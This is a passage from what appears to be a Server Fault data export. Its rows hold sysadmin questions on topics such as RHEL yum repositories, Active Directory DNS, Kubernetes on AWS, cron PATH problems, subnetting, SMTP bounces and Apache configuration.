rhui-REGION-client-config-server-7/x86_64 Red Hat Update Infrastructure 2.0 Client Configuration Server 7
rhui-REGION-rhel-server-releases/7Server/x86_64 Red Hat Enterprise Linux Server 7 (RPMs)
rhui-REGION-rhel-server-rh-common/7Server/x86_64 Red Hat Enterprise Linux Server 7 RH Common (RPMs)
vesta/x86_64 Vesta - cmmnt
</code></pre>

<p>Problem is vesta is disabling all repository - I think because it's assuming that requirements (i.e. <code>php-common</code>, which is in <code>rhui-REGION-client-config-server-7/x86_64</code>) are in the base repository.</p>

<p>Is there a way to rename the <code>rhui-REGION-client-config-server-7/x86_64</code> into <code>base</code> or make an alias to it?</p>

<p>EDIT: repository file item:</p>

<pre><code>[rhui-REGION-rhel-server-releases]
name=Red Hat Enterprise Linux Server 7 (RPMs)
mirrorlist=https://rhui2-cds01.REGION.aws.ce.redhat.com/pulp/mirror/content/dist/rhel/rhui/server/7/$releasever/$basearch/os
enabled=1
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release
sslverify=1
sslclientkey=/etc/pki/rhui/content-rhel7.key
sslclientcert=/etc/pki/rhui/product/content-rhel7.crt
sslcacert=/etc/pki/rhui/cdn.redhat.com-chain.crt
</code></pre>
","<amazon-ec2><redhat><yum><amazon-ami><vestacp>","2017-11-14 18:33:49"
"811816","Preventing domain controller from adding A/AAAA for domain root","<p>I have set up the domain <code>contoso.com</code>. The domain controllers in the domain are also the DNS servers within the network.</p>

<p>When users try to resolve <code>contoso.com</code>, they receive the A/AAAA records of the domain controllers. However, we want <code>contoso.com</code> to resolve to a different address (the web server of the company).</p>

<p>We added the A/AAAA records for the web server to the domain root, but noticed that there were additional A/AAAA records, pointing to the domain controllers. We removed those, but they are being re-created.</p>

<p>How do I prevent this from happening? I did not notice any degraded performance or other issues while the records were not present.</p>
","<domain-name-system><active-directory><windows-server-2012-r2>","2016-10-28 08:04:57"
"883474","Unable to find reasonable kubernetes installation documentation","<p>I have been trying to setup kubernetes for a week now as part of an evaluation, but I can only find </p>

<ul>
<li>extremely complex manual solutions that are already out of date or outright broken</li>
<li>insanely simple solutions that break a mind numbing amount of best practices</li>
<li>""get to know kubernetes cluster all on one box""</li>
</ul>

<p>My base requirements going in are:</p>

<ol>
<li>I have AWS</li>
<li>I have VPCs, Subnets + peering already created</li>
<li>I need to be able to build one cluster per environment in the appropriate VPC</li>
<li>Ubuntu 16.04</li>
<li>I should have control over the SGs and instances (terraform + ansible)</li>
<li>Absolutely no single points of failure.  </li>
<li>I don't want a solution that creates unnecessary layers by adding tools or controllers above the masters. (WHY?!!)</li>
<li>No blatant security holes</li>
</ol>

<p>I've tried a couple solutions, but they have failed spectacularly, and require #7</p>

<p>kubeadm (breaks #6, #7)</p>

<ul>
<li>I gave this a try because it was supposed to be a reasonable solution for using existing infrastructure.</li>
<li>I was able to get a cluster operational with 1 master and 2 nodes, but it just didn't seem to be working fully (kubernetes-dashboard was inaccessible)</li>
<li>In the end, even the tool itself didn't recommend production due to the fact that the docs state the master node cannot be made HA.</li>
</ul>

<p>juju / conjure-up with ""canonical kubernetes"" (breaks #2, #3, #5, #6, #7, #8)</p>

<ul>
<li>did not allow specification of VPC.  Nevermind managing SGs, instances, working via bastion host.</li>
<li>It actually created instances in ec2-classic...? </li>
<li>instance naming in AWS is awful (can't tell what's what - masters vs etcd vs ??)</li>
<li>15 security groups for a 3 worker cluster, 9 of which are completely empty?</li>
<li>conjure-down fails with 'NoneType' object has no attribute 'controller'</li>
<li>It created a single point of failure in the ""controller machine""</li>
<li>INGRESS TCP 22 0.0.0.0/0 &lt;- I am going to cry (this is why ec2-classic went away years ago)</li>
</ul>
","<ubuntu><amazon-web-services><kubernetes>","2017-11-15 00:18:27"
"811922","Automated Installation Testing on Windows","<p>I am looking for some software I can work with that will allow me to test that programs were installed and are functioning correctly. Instead of opening each program manually and see it working, I would like something similar to automated unit/integration testing for software development. </p>

<p>I've looked into things like <a href=""http://ahkscript.org/"" rel=""nofollow noreferrer"">AutoHotKey</a> and <a href=""http://www.sikuli.org/"" rel=""nofollow noreferrer"">Sikuli</a> which seem promising but don't quite meet what I need and they require dependencies to be installed on the system which I am not a huge fan of.</p>

<p>A use case I imagine would be like installing Microsoft Word on a system. I would be able to run this script/program that would open the program itself, open a new document, write some lines to that document, and save the file. This would ""prove"" that this functionality in Word is working correctly.</p>

<p>Here is essentially what I am looking for:</p>

<ul>
<li>Able to open/run programs</li>
<li>Able to perform tasks in those programs</li>
<li>Unit test oriented</li>
<li>Able to output pass/fail for tests</li>
<li>Able to run on Windows 7 or later</li>
<li>Can be run off of USB drive alone</li>
<li>Preferably script oriented (i.e. using Python or lua)</li>
</ul>

<p>Any ideas or suggestions? I am unaware of industry standards if there are any for this. I am also not completely opposed to writing custom software to integrate with some existing APIs but I would like it to be easy to write and modify tests.</p>
","<healthcheck><automated-testing><automated>","2016-10-28 16:42:17"
"811933","Why there are only 13 Root Server","<p>Initially, when Internet was just growing up, DNS packet size was use to be only 512 bytes (at max), dns servers was listening only on udp protocol and due to other similar issues; number of Root servers was fixed to 13 numbers so that answer from root server can be put into a single packet of 512 bytes.</p>

<p>Now, we are in 21st century, we have DNSSEC enabled across the domains (from last 2-3 years, all the gTLDs are signed) and this force all the servers (be it authoritative or caching) to listen and reply on TCP (along with UDP)  AND this increases a DNS packet size upto 4096 bytes.<br></p>

<p>I know that multiple instances of each root servers are running and they are providing us resiliency and till date we hadn't face any such major downtime issues with root servers.</p>

<p>Then also, what is stopping us from increasing the number of Root Servers ? <br></p>
","<domain-name-system>","2016-10-28 17:16:06"
"883578","Calling a utility by name, without the full path, from cron doesn't work","<p>I have some console utility installed. It's in <code>/usr/local/bin/my_utility</code>. I can call it as <code>my_utility</code> and it works well. I've created a cron task which runs a bash script. That bash script calls <code>my_utility</code>. The error which occurs only when I can the bash script via cron is ""my_utility: command not found"". </p>

<p>Why isn't it found? Running the bash script directly works well. Also, the script uses other env. variables with no failure.</p>
","<linux><cron><environment-variables>","2017-11-15 14:52:40"
"812035","Use SSD to buffer a storage Hard Drive","<p>I have a specific storage server plan in mind. I want to use a SSD to buffer all data that I want written to a hard drive. The data would be written to the SSD, but copied to the HDD aswell. Kinda like Raid 1, but without throttling - but still showing up as one logical drive.</p>

<p>This would mean I can just plop a 20GB file to the logical drive, it would get copied in the background and removed from the SSD afterwards.</p>

<p>I plan to make my own local server for this, so any solutions are acceptable, but with a software solution Linux is preffered.</p>
","<storage><ssd><buffer>","2016-10-29 12:43:26"
"883636","Persist /etc/environment variables to non interactive user","<p><strong>Testing OS:</strong> RHEL7</p>

<p><strong>Required OSs</strong>: RHEL &amp; Derivatives &amp; AIX</p>

<p>I have a user that was created as follows:</p>

<pre><code>sudo groupadd madt
sudo useradd -r -g madt -s /bin/false madt
</code></pre>

<p>That user is being used in a <code>systemd</code> service as follows:</p>

<pre><code>[Unit]
Description=MicroStrategy Mobile Access Distribution Tool
After=syslog.target

[Service]
User=madt
ExecStart=/usr/bin/java -jar /opt/pandera/mobile-registration/mobile-access-distribution-tool-1.0.0.jar --spring.config.location=/opt/pandera/mobile-registration/
SuccessExitStatus=143

[Install]
WantedBy=multi-user.target
</code></pre>

<p>The java app requires that an environment variable be present. I've set the variable in <code>/etc/environment</code> and confirmed that it works for root and all other interactive users.</p>

<p><strong>How can I get the madt user to recognize my environment variable?</strong></p>
","<linux><redhat><systemd><rhel7>","2017-11-15 20:09:52"
"883643","Replacing Backup Exec 2010 R3 - Need Recommendations","<p>I have been upgrading servers over the last few weeks, and stumbled on the realization that our current backup solution needs to change due to incoming incompatibilities. We currently use Symantec Backup Exec 2010 R3 to do weekly backups of eight VMs; full, incremental, and removable duplicates of the full backups. We need something to replace it, ideally not subscription based, which will perform the same function reliably, and also ideally be easy(ish) to configure. And it needs to support WS2008 R2 through WS2016. </p>

<p>Also, we do not need a solution for cloud backups. We currently do not have one, but at one of our other sites we use exclusively cloud backups and so we're good there. </p>

<p>Thanks!!! serverfault rocks!!!</p>
","<backup><exec>","2017-11-15 20:57:13"
"883663","When to use storage queue on Azure?","<p>What is the difference between blob storage trigger and queue storage trigger?
Blob storage trigger sound like a queue to me. What are some examples that make sense for each?</p>
","<azure>","2017-11-15 23:48:17"
"883675","Preventing RDP screen to go black when minimized","<p>I am running some automated scripts on VM nodes and using certain tools to create a video capture of whatever is happening on the screen. One of the limitations of the video capturing software is that the screen on the remote machine must be rendered, meaning that I must have an active RDP session to the VM as long as I want the screen to be captured. That all works fine when I create an RDP session (mstsc) to that VM and leave it on my screen. However, when I minimize the RDP session, it seems like the remote screen becomes black and as a result prevents video capture. </p>

<p>I wonder where there is a way I can force the RDP session to render the screen as usual, even when the window is minimized?</p>
","<windows><remote-desktop><rdp><mstsc>","2017-11-16 03:05:10"
"883698","""date"" returning a month as a 3-char word","<p>At the moment I call <code>date</code> this way:</p>

<pre><code>  date '+%Y %m %d' 
  # ==&gt; 2017 12 01
</code></pre>

<p>How should I adjust it so that it return a month in the 3-char format? Like this:</p>

<pre><code> date '+%Y %m %d'
 # ==&gt; 2017 dec 01
</code></pre>
","<linux><terminal><date><utilities>","2017-11-16 08:14:03"
"812348","Computer naming convention for new Active Directory domain","<p>I'm planning to setup new company, with new Active Directory domain for 100-4000 users. I've chosen domain name and now I am wondering about possible computer naming convention. Company is going to have standardized computers from HP. </p>

<p>Is going by Serial Number of machine a good option? Or do you see risks here by exposing machine serial number to the world when user moves away? What would be recommended naming convention assuming we want to go for brandless naming (such as domain name is brand less). </p>
","<active-directory>","2016-10-31 17:38:03"
"883916","Per-second billing for custom AMI","<p>In the beginning of October this year Amazon announced per-second billing for EC2 instances. This potentially could be a big cost reduction for me.
However Amazon also says this billing is platform dependent:</p>

<blockquote>
  <p>Per-second billing is not currently applicable to instances running Microsoft Windows or Linux distributions that have a separate hourly charge. Marketplace AMIs that do not have a separate hourly charge are
  eligible for per-second billing.</p>
</blockquote>

<p>Does this new type of billing apply also to custom AMIs based on Amazon Linux?
How can I check what kind of billing I have? </p>
","<amazon-web-services><amazon-ami><amazon-linux><amazon-beanstalk>","2017-11-17 10:46:41"
"812420","Windows server behind NAT with multiple websites in hyper-v VM's","<p>Excuse me if the title is a bit misleading.  I have a server ( Dell r710 , 64GB RAM, with Windows Server 2016). </p>

<p>I have a business developing websites but want to expand into having my own server/data center to reduce expense of hosting and for the satisfaction of obtaining more knowledge. I am the only person running the business so I have to be the network admin guy along with being a developer. </p>

<p>I have a NAT router/modem and multiple VM's on my server. My server has 4 Ethernet ports, I have two connected from the server to the router.  </p>

<p>I Just cant wrap my head around how to correctly run the server and network traffic.  Do I create a virtual machine with nginx and port forward the routers public IP to the ip of my nginx server within the VM and then have nginx direct the user to a certain VM? </p>

<p>How do you have your office/home server set up and what method do you use to effectively direct users to the multiple sites running on your server ? </p>

<p>Also, could I setup two name servers within two separate VM's and handle DNS resolution that way ? Please help  </p>

<p>My goal is simply to host multiple websites on one windows server within hyper-v VM's. </p>

<p>Please help me out And also work with me in anyway possible by asking questions that you may have. Thanks a lot!</p>
","<networking><windows-server-2016><windows-home-server>","2016-11-01 01:11:56"
"812423","Is it worth it to install VMWare Tools on a non-graphical Linux guest (Red Hat 7 hosting an Oracle server)","<p>This came up because I was not able to activate the time synchronization function from the VCD. Most of what I've seen that discussed the benefits of installing VMWare tools looks like it applies to Windows machines, and perhaps also graphical Linux machines. I wonder if it will be worth it to install on this particular Red Hat Oracle Server, which also is mission critical to the point that my client is very apprehensive about making changes and restarting it. However, perhaps it does them a disservice by not having them installed. Thanks.</p>
","<vmware-esx><rhel7><time-synchronization><vmware-tools>","2016-11-01 02:02:31"
"883983","How do I add an SSL certificate to a CNAME?","<p>My website has SSL enabled on www.mysite.com and mysite.com, I did it with Let's Encrypt in Apache, but mail.mysite.com is actually a <strong>CNAME</strong> to a different Mail provider. It's basically their website with my domain name. As I can see, it doesn't have an HTTPS. How do I add an SSL certificate to it?</p>
","<ssl><cname-record>","2017-11-17 18:43:14"
"812681","Recommend monitoring service with public REST API and SMS alerts?","<p>I need to monitor my service for uptime. My service can only do push notifications of it's status. Meaning, I can report to some 3rd party that I'm alive and well, but it cannot act as a server by itself, so no pinging it.</p>

<p>Can you recommend existing web-service which support this mode of operation?
They should also support SMS alerts (or any other mobile phone notifications).</p>

<p>It would be cool for them to have a RESTful API so I can integrate my service with them.</p>

<p>I already took a look at Uptime Robot and PagerDuty but I cannot figure out if the support this mode of operation.</p>

<p>The service does not have to be free.</p>
","<monitoring><windows-service><uptime><pagerduty>","2016-11-02 08:38:51"
"812735","Adventages of Docker as development envioroment","<p>I have my dev server with bit older PHP version. However sometimes i need newer versions of PHP or MySQL for certian projects, sometimes older.</p>

<p>I'm considering setting up a Docker server, but I'm not sure how it would work out.</p>

<p>My main goal would be to host few different servers on one machine. Would docker allow me to do such a thing?</p>

<p>Currently i have one server and end up reinstalling XAMPP on my local machine for some projects.</p>

<p>What I would like to achive: One machine, few servers on it without VM. And each server would have its own domain. Would docker be a good solution for such setup? (if its possible).</p>
","<linux><mysql><docker><apache2>","2016-11-02 13:51:48"
"884260","Access Denied for a user in a group that owns a folder","<p><a href=""https://i.sstatic.net/QxC8V.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/QxC8V.png"" alt=""enter image description here""></a></p>

<p><a href=""https://i.sstatic.net/VLdSW.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/VLdSW.png"" alt=""enter image description here""></a></p>

<p>Yet gitlabbackup user is unable to list the files in that folder.</p>

<pre><code>[gitlabbackup@gitLAB-SRV gitlab]$ cd backups/
-bash: cd: backups/: Permission denied
</code></pre>
","<linux><permissions>","2017-11-20 11:12:25"
"812862","How domain points to exact host?","<p>I know that when we put nameserver to domain it points to server then we put domain adress to a host so it basically connects each other.
But lets say when I`m using AWS or other providers they give same Nameserver to everyone. If someone else puts my domain adress to his server by using same provider what happens ? There will be same nameservers for both of us. </p>
","<domain><hosting><host><ns-record>","2016-11-03 00:29:40"
"884285","How to check why a write failed?","<p>If I was to debug a service on a machine and I determined that a write was failing, how could I check why the write failed?</p>

<p>I know the system call in C will return -1 and then we can check what constant <code>int errno</code> contains (<code>EINVAL</code>,etc.). However, if I'm not able to check this how would I go about checking the cause of the error? Would dmesg show an error at the block device level for me in this case?</p>
","<linux><io><debugging>","2017-11-20 14:18:05"
"812981","When is it okay to reboot a server?","<p>I need to reboot a server to get a certain task done. Assuming no other users are present in the system, do I need to ask permission to reboot a server? What if there is some process that needs to complete that was not initiated by a user? I am speaking specifically about a server I ""do not own"". </p>

<p>Can someone explain the finer points of rebooting a server (I.e. when it is okay to do)?</p>
","<terminal-server>","2016-11-03 14:17:06"
"813048","Microsoft Azure Load Balancer Testing","<p>I have created an Internet-facing load balancer using the Azure Portal.</p>

<p>Can someone let me know if there is a way to test it?</p>

<p>Cheers</p>

<p>Carlton</p>
","<azure>","2016-11-03 18:35:10"
"813229","Share RPD/Vnc but not internet","<p>My headless Ubuntu box has 2 ethernet ports. One is connected to the internet. The other I would like to use to share vnc/rdp to a Macintosh but <strong>not</strong> allow the Macintosh to reach the internet nor be reachable from the internet.  So the macintosh is technically not internet connected but can access the internet via rdp with the Ubuntu server.  How do I configure this on Ubuntu?</p>
","<ubuntu><routing><rdp><vnc>","2016-11-04 14:52:30"
"813238","Subnetting confusion","<p>Okay, studying Networking at university and I cannot remember the answer to a very simple question.</p>

<p>Can different subnet's have the same subnet mask?</p>

<p>IE Subnet 1 Range: 192.168.0.0 - 192.168.0.31 with a subnet mask of 255.255.255.224
Subnet 2 Range: 192.168.0.48 - 192.168.0.79 also with a subnet mask of 255.255.255.224</p>

<p>Are these two both valid subnets, or do the masks have to be different?</p>

<p>Thanks in advance!</p>
","<networking><subnet>","2016-11-04 15:20:02"
"884788","Accessing devices behind routers without port forwarding","<p>Routers obviously are capable of communication between a particular computer in the local network and the internet.</p>

<p>Now, if I happened to know the local ip address of a device, and also the public IP address of it's router, how can I communicate with that device from the internet without having to use port forwarding.</p>

<p>The reason why I ask this is because I'm constantly on the move and I try hosting a server on my laptop with my phone's carrier data, but they do not allow port forwarding.</p>
","<networking><router><port-forwarding>","2017-11-23 02:08:43"
"884883","Automated testing in virtual machines using Hyper-V","<p>I was tasked to automate our department's testing process.<br>
To do the testing I first have to install a setup of our application on the host system and run another application, the tester, afterwards.<br>
The tester application uses an <code>ActiveX</code> control to control the previously installed application. In order to run the tester application I need a graphical interface, so I can't run the tests headless.  </p>

<p>To automate the process I thought about using <code>Hyper-V</code> and a <code>Powershell</code> script to automatically deploy clean <code>Windows VMs</code>, install the setup, run the tester application and destroy the <code>VM</code> afterwards.  </p>

<p>The deployment process works just fine but now comes the tricky part of actually running the tester application without manually interacting with the <code>VM</code>.<br>
Initially I thought that I could remote control the <code>VM</code> via <code>Powershell</code> and just execute the tester application that in turn opens up its GUI and does the testing.  </p>

<p>Unfortunately I was wrong. I googled around for a bit but couldn't really find anything so far that worked.  </p>

<p>My question is now if my approach is feasible and if it is how I possibly solve my problem?</p>
","<windows><virtual-machines><hyper-v><windows-10><automation>","2017-11-23 17:00:29"
"813446","AB benchmark: why is my app 10 times faster increasing concurrency 10 times?","<p>I don't understand very well the behavior of my web application.
It's a php web application running on Nginx.
I tried to test some simple page and I get:</p>

<pre><code>ab -n 5000 -c 500 http://xxx
Req per sec: 600
Time per req 1.6 ms (mean across requests)

ab -n 5000 -c 100 http://xxx
Req per sec: 50
Time per req 20 ms (mean across requests)
</code></pre>

<p>I probably don't understand the result.
I thought that increasing the concurrency 10 times I would see a dramatic decrease in average request performance...where am I wrong?</p>
","<performance><ab>","2016-11-06 09:41:13"
"884980","Recursively removing the content of a directory but not a directory itself","<p>I have a directory which contains other directories and files of unknown depth. How can I delete <strong>only the content</strong> of the directory -- nested directories and files -- but not directory itself? </p>

<p>I've tried these and they didn't work - nothing was deleted:</p>

<pre><code>rm -rf my_dir/*/*
rm -rf my_dir/**
rm -rf my_dir/*

# and
cd my_dir
rm -rf */*
</code></pre>

<p>How to do that?</p>
","<linux><command-line-interface><directory><terminal>","2017-11-24 09:57:46"
"813565","MAMP setting up a host","<p>I've a website which use a google api by a specific domain. Then my google App work on domain like dev.mydomain.com</p>

<p>So i need to create a VH but it doesn't works. </p>

<pre><code>&lt;VirtualHost *:80&gt;
  DocumentRoot /Applications/MAMP/htdocs/myproject
  ServerName www.dev.mydomain.com
  ServerAlias dev.dev.mydomain.com
  &lt;Directory ""/Applications/MAMP/htdocs/myproject""&gt;
    Order allow,deny
    allow from all
  &lt;/Directory&gt;
&lt;/VirtualHost&gt;
</code></pre>

<p>why when i call <a href=""http://dev.mydomain.com"" rel=""nofollow noreferrer"">http://dev.mydomain.com</a> it return me an error ""can't find the server www.dev.mydomain.com :/ (i work on httpd-vhost.conf and i've enabled it in my http.conf).</p>
","<web-server><httpd.conf><web><serveralias>","2016-11-07 10:37:59"
"885066","No internet connectivity on Fresh Windows 10 Installation","<p>I installed Windows 10 Pro by using the Media Creation Tool provided by Microsoft.</p>

<p>The installation went on without a hitch. But now I can't access internet through my web browsers.</p>

<p>Weird thing is, it worked for a while and then I downloaded Google Chrome and now no browser (Chrome/Edge/IE) can access the internet. But, other apps like Spotify or Windows Store apps work fine. Even the Windows Updates are working in the background.</p>

<p>What's causing this?</p>

<p>Thanks and Best Regards. </p>
","<windows><internet>","2017-11-24 19:53:49"
"813586","354 End data with <CR><LF>.<CR><LF>, mail not sent","<p>I know, there is already an answer to this smtp-status, but sorry: i don't get it. A Customer of mine sends a big amount of mails and some can't be send cause of:</p>

<pre><code>This is the mail system at host mailserver.blabla.local.

I'm sorry to have to inform you that your message could not
be delivered to one or more recipients. It's attached below.

For further assistance, please send mail to postmaster.

If you do so, please include this problem report. You can
delete your own text from the attached returned message.

                   The mail system

&lt;mail@domain.de&gt;: host mail.hostingserver.de[ip] said: 354 End data
    with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; (in reply to end of DATA command)
</code></pre>

<p>More information:</p>

<pre><code>Final-Recipient: acc1; mail@domain.de
Original-Recipient: acc1;info@domain.de
Action: failed
Status: 5.5.0
Remote-MTA: dns; mail.hostingserver.de
Diagnostic-Code: smtp; 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;

Return-Path: &lt;sender@domain.de&gt;
Received: from localhost (localhost [127.0.0.1])
    by neptun.migra-mv.local (Postfix) with ESMTP id 071A07418E6;
    Thu,  3 Nov 2016 12:04:22 +0100 (CET)
X-Virus-Scanned: by amavisd-new-2.10.1 (20141025) (Debian) at migra-mv.local
Received: from mailserver.blabla.local ([127.0.0.1])
    by localhost (mailserver.blabla.local [127.0.0.1]) (amavisd-new, port 10024)
    with ESMTP id ZkXsQejEkDHg; Thu,  3 Nov 2016 12:04:10 +0100 (CET)
Received: from [192.168.2.196] (unknown [192.168.2.1])
    by mailserver.blabla.local (Postfix) with ESMTPSA id 512A8741B70;
    Thu,  3 Nov 2016 12:03:31 +0100 (CET)
To: Migra MV &lt;sender@domain.de&gt;
From: IntegrationsFachDienst Migration MM &lt;sender@domain.de&gt;
Subject: =?UTF-8?Q?Aktuell:_=c3=9cber_200_Bildungsma=c3=9fnahmen_auch_f?=
 =?UTF-8?Q?=c3=bcr_Zugewanderte_in_ganz_M-V?=
Message-ID: &lt;045abb9f-de00-bdc5-cede-01e338164930@migra-mv.local&gt;
Date: Thu, 3 Nov 2016 12:03:51 +0100
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101
 Thunderbird/45.2.0
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary=""------------55D5725BF82BAD7B1782022E""
</code></pre>

<p>Why are we getting this error and aren't the messages sent? In fact, most of the messages are send without problems. Could this be an error from the recipient?</p>
","<email><smtp><email-server><thunderbird>","2016-11-07 13:13:27"
"813626","VSTS IP Address Ranges","<p>I have an application on VSTS/visualstudio.com</p>

<p>I would like to set up continuous deployment to AWS.</p>

<p>I currently restrict access to the database server with whitelisted IP on the firewall.</p>

<p>This means visual studio can't access the database server.</p>

<p>Is it possible to get the IP address range used by visual studio online so I can add it to this list?</p>

<p>Thanks</p>
","<firewall><ip><deployment><visual-studio>","2016-11-07 16:32:37"
"885076","Make MX records point to two servers (gmail and hostgator server)","<p>My website is hosted on Hostgator and some of users use gmail mail service and some other use POP3 service, so I'm not sure if it's possible to make MX records to point to both these servers (gmail and POP3)? for example: making inf@example.com used by gmail while gm@example.com used by POP3</p>
","<email><mx-record>","2017-11-24 22:24:46"
"813740","Public Dns forwared","<p>i wish every one was fine ,, i have issue , the issue is 
if i have DNS Server (Public ) let say the ip DNS 10.10.0.1(xx.com) and i have another Server it have Public Ip Let say 10.10.0.2 And i installation Nat Service all traffic forward (VM) to Zimbra exchange Email s, i create the mx record on dns public mail.xx.com and the ip address (10.10.0.2) (public server) to forward traffic when i nslookup everything is good but from VM ZIMBRA Can not resolved mx record and i can send email but i can't receive any email from other </p>
","<dns-hosting>","2016-11-08 08:59:35"
"885268","Upgrade vSphere 6.0 standard to 6.5","<p>I have several ESXi hosts that running vSphere version 6.0 standard licenses. Now, I have a plan to upgrade all of that to vSphere version 6.5. I'm not sure to upgrade to vSphere 6.5 for free. Can I upgrade to 6.5 for free?</p>
","<vmware-vsphere>","2017-11-27 03:31:21"
"885273","How to monitor EMC VNXe3200?","<p>Currently, I'm using Solarwind to monitor my system, but VNXe can not. Any solution to monitor this? I just get a notification via email or SMS when my disk or array is failed.
Thanks.</p>
","<monitoring><storage-area-network><performance-monitoring><system-monitoring>","2017-11-27 04:33:56"
"885510","Azure managed container service (AKS) Static IP","<pre><code>az network public-ip create --name &lt;name&gt; --resource-group &lt;rg name&gt; --allocation-method Static --dns-name &lt;dns name&gt;

{
  ""publicIp"": {
    ""ipAddress"": ""1.2.3.4"",
    ...
    ""provisioningState"": ""Succeeded"",
    ...
  }
}

$ kubectl describe svc -n kube-system ingressservice
...
Events:
  Type     Reason                      Age               From                Message
  ----     ------                      ----              ----                -------
  Normal   EnsuringLoadBalancer        9s (x2 over 24s)  service-controller  Ensuring load balancer
  Warning  CreatingLoadBalancerFailed  9s (x2 over 14s)  service-controller  Error creating load balancer (will retry): Failed to ensure load balancer for service kube-system/ingressservice: user supplied IP Address 1.2.3.4 was not found
</code></pre>

<p>Help? Shouldn't this just work? The IP is in the same resource group.</p>

<p>Is it an issue with AKS? It seems to work for ACS..</p>
","<azure><containers>","2017-11-28 13:07:24"
"885644","How can i deactivate the apache built in httpd web server on MAC ?","<p>When i starting mine MAC and got to the browser to localhost , i got the localhost output ""It Working"" from apache . 
After typing the command <code>sudo apachectl stop</code>, the server I THINK is stopped and after trying to go to localhost i got <code>localhost refused to connect</code>. BUT! When i open a new tab on the browser (Chrome) and go to localhost i got again ""It Works"" .. 
I can't understand that behaviour , can anybody explain to me ?
How can i deactivate the built in Apache server so it won't start again after i restart mine OS .. (I mean deactivate forever, because i want to use XAMP).. Need your help please i struggle with that 3 days already . </p>
","<apache-2.4>","2017-11-29 06:01:05"
"885703","Something is regenerate ports.conf","<p>Since the last update of my Raspbian ""something"" is updating my apache ports.conf file by adding these two lines automatically:</p>

<pre><code>Listen 81
</code></pre>

<p>And:</p>

<pre><code>&lt;IfModule mod_ssl.c&gt;
Listen 443
&lt;/IfModule&gt;
</code></pre>

<p>But I need you to listen to the port 4443 because I'm using sslh to listen 443</p>

<p>This is the full ports.conf file</p>

<pre><code>Listen 80
#Listen 10008
Listen 81

&lt;IfModule ssl_module&gt;
        Listen 192.168.21.106:4443
&lt;/IfModule&gt;

&lt;IfModule mod_gnutls.c&gt;
        Listen 192.168.21.106:4443
&lt;/IfModule&gt;

&lt;IfModule mod_ssl.c&gt;
Listen 443
&lt;/IfModule&gt;
</code></pre>

<p>Does anyone know what is making this changes?</p>
","<debian><apache-2.4><mod-ssl><raspbian>","2017-11-29 11:52:12"
"885923","How to generate the CSR on Google Cloud Platform","<p>I'm going to buy a SSL in order to install it in my e-commerce.
I need to generate the CSR first before to buy the certification.</p>

<p>Anybody have a tutorial in order to generate the CSR?</p>

<p>Thanks.</p>
","<ssl><google-cloud-platform><csr>","2017-11-30 09:36:31"
"886059","Crontab not running all @reboot services","<p>In my raspberry I'm using the following crontab to start two services at startup. The first one works fine but the second one doesn't (even though it works fine when I launch it manually). Any suggestions what could be causing this are highly appreciated.</p>

<pre><code># m h  dom mon dow   command
0 * * * * python pythonprojects/temperature_sensor/read_temperature.py
@reboot             sudo /usr/local/bin/pigpiod
@reboot             sudo /usr/bin/autossh -M 20005 -N -T -R22222:localhost:22 -i ssh-ec2/ec-key.pem ec2-user@xx.xx.xx.xxx
</code></pre>
","<cron>","2017-11-30 23:39:10"
"886074","Trouble for logining in to Ubuntu","<p>I'm finding a trouble in root local host login in Ubuntu . I am using Ubuntu for the first time in my new laptop Acer aspire 5 A515-51 how could I over come it.</p>
","<linux>","2017-12-01 03:27:06"
"886094","How do I use my computer as a host for a website - given my IP is static?","<p>I search online a lot for this but I was not able to find out how.</p>

<p>My ISP gave me a static IP address. Now, I connected this ISP Line to a <code>DLink DIR-850L</code> and then put a LAN cable from the router to my system.</p>

<p>I assigned a local static IP to my system.</p>

<p>Now, how do I route traffic to my static IP Address to my local computer?</p>

<p>Is this even possible?</p>
","<localhost><static-ip>","2017-12-01 06:21:17"
"886187","Orchestrator 2012 vs 2016","<p>I'm still trying to improve my skills. Right now I'm testing Microsoft Orchestrator 2012 and it looks like a nice feature. I was reading about Microsoft Orchestrator 2016 here <a href=""https://www.starwindsoftware.com/blog/upgrading-system-center-orchestrator-2012-r2-to-2016"" rel=""noreferrer"">https://www.starwindsoftware.com/blog/upgrading-system-center-orchestrator-2012-r2-to-2016</a>, and so here is the question, is Orchestrator 2016 better than 2012, should I upgrade or stay with the previous version?</p>
","<windows><operations-orchestration>","2017-12-01 17:44:52"
"886189","Setting up Managed Switch as Unmanage","<p>New to Networking,
Currently, I have Cisco sg 300 POE Manage Switch and want to make this switch as unmanaged. Can I make this switch as unmanaged just by plug and play or I need to set it up by Configuration to make it happen as Unmanaged. </p>
","<networking><switch>","2017-12-01 18:01:26"
"886198","What prevent me from creating my own nameserver?","<p>Let's say I buy a domain from GoDadday <code>www.example.com</code>. What prevents me from configuring the name server to point to <code>ns1.myownserver.com</code>. And in <code>ns1.myownserver.com</code> I can create any kind of mapping I want?</p>
","<networking><domain-name-system><nameserver>","2017-12-01 20:14:39"
"886231","Ubuntu 16.04 public wifi connection failure ""The request is invalid due to malformed syntax or invalid data.""","<p>I use Ubuntu 16.04 on my laptop and I can't connect public library's free wifi. First, It shows this error when I try to open <strong>HTTP</strong> pages:</p>

<p><a href=""https://i.sstatic.net/v8700.png"" rel=""nofollow noreferrer"">Open me in new tab</a></p>

<p>When I try to open <strong>https</strong> pages, it says ""This site can’t be reached"" (ERR_QUIC_PROTOCOL_ERROR). Then I tried to connect to my mobile phone. It showed authentication page and successfully connected.
I tried to google this issue and all of them showed how to resolve it from admin's perspective, not a word about what user can do. Then I asked help from library's network admin. Unfortunately, He can't help either. Any solution will be strongly appreciated.</p>
","<authentication><wifi><400><bad-request>","2017-12-02 02:10:20"
"886292","Windows Server 2016 setup","<p>I have physical server with the following configuration: HP ProLiant DL320e Gen8 v2, E3-1231v3, 32 GB, 2x1 TB</p>

<p>I plan to install MS Windows Server 2016 Datacenter and create multiple virtual machines for following purpose:</p>

<p>1x VM (2GB RAM) to be used as RD Gateway for secure access through RDP to other servers 
1x VM (12GB RAM) SQL Server - will host MS SQL and MySQL (no heavy use) 
1x VM (6GB RAM) App / Web Server 2x VM (4GB RAM each) for development purpose
